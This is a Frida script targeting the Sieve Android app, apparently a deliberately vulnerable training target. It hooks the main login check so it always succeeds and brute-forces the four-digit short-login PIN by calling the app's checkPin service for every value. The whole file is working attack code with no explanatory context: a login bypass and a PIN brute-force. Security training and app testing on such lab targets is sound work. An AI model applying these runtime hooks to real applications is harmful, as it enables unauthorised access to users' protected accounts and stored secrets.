setImmediate(function(){
	Java.perform(function(){
		var loginBypass = Java.use("com.mwr.example.sieve.MainLoginActivity");
		loginBypass.checkKeyResult.implementation = function(arg){
			console.log("[*] Success Login Bypass");
			this.checkKeyResult(true);
		}
		
		function padToFour(number){
			if(number<=9999){
				number = ("000"+number).slice(-4); //0001 0002 000333-> 0333
				return String(number);
			}
		}
		
		
		var pinBypass = Java.use("com.mwr.example.sieve.ShortLoginActivity");
		pinBypass.submit.implementation = function(arg){
			var service = this.serviceConnection.value;
			for(var i=0; i<9999; i++){
				service.checkPin(padToFour(i));
				console.log(padToFour(i));
			}
		}		
	})
})